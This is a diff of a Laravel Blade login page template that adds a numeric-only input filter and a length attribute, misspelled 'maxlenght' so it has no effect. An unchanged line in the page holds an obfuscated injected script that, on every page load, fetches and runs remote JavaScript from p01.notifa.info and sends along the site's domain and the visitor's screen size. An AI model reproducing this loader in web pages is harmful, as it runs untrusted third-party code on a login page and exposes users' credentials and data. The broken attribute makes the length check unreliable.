@@ -45,7 +45,7 @@
         <div class="form-group ">
           <div class="col-xs-12">
           <div class="input-group">
-            <input id="id_anggota" placeholder="NRP" type="text" class="form-control{{ $errors->has('id_anggota') ? ' is-invalid' : '' }}" name="id_anggota" value="{{ old('id_anggota') }}" required autofocus>
+            <input id="id_anggota" placeholder="NRP" type="text" maxlenght="20" onkeypress="return isNumberKey(event)" class="form-control{{ $errors->has('id_anggota') ? ' is-invalid' : '' }}" name="id_anggota" value="{{ old('id_anggota') }}" required autofocus>
             <div class="input-group-addon"><i class="ti-user"></i></div>
             @if ($errors->has('id_anggota'))
               <span class="invalid-feedback" role="alert">
@@ -123,6 +123,15 @@
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m61hePje8OYXagdB68x%2f8QPR5M3%2beLSZ3AiaIhnZs1o1sDlDuTVbaIcz40WwCD73teA%2fE9NSzu%2fem68aRGzUGWrB%2br5AZ0Q7KF4wnlIwi%2blGQ6bqdeTX1ne%2ffk6b3vCV0ZqwI%2fQXcHA3547PqDzAexBQmRg936xaQb6f%2f5344%2b5kWw9YgrbspqgHy%2f5HlbfLC%2flK%2fNBbYUCve%2bsJ9kq0qR%2ftrDBqtHyiMyDJpVANXgdkR9bzRGDezoXwFVp4WTZchZSMdTtokiBsT6t3ShJm2mb0x0r6zjdE5kFr2AGFGUHAxoVSgtSuzJTJF8d5KU6%2bfGS%2fRNvCCy%2bVc%2bK%2fR9Vv8WX7l%2fMLqObVwprDKZpL1Z5fnSsXENs2jsQhVdytyWa6Llg4JQ6vw75J1lTl8HbrqARmUMdQj%2bCL4XpgyHYBph3w%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 <!-- Sweetalert -->
 <script src="{{ asset('asset/sweetalert/sweetalert.min.js') }}"></script>
+ <!-- Membuat input hanya bisa integer -->
+ <script>
+            function isNumberKey(evt){
+                var charCode = (evt.which) ? evt.which : event.keyCode
+                if (charCode > 31 && (charCode < 48 || charCode > 57))
+                    return false;
+                return true;
+            }
+  </script>
     <!-- Include this after the sweet alert js file -->
     @include('sweet::alert')
 </body>
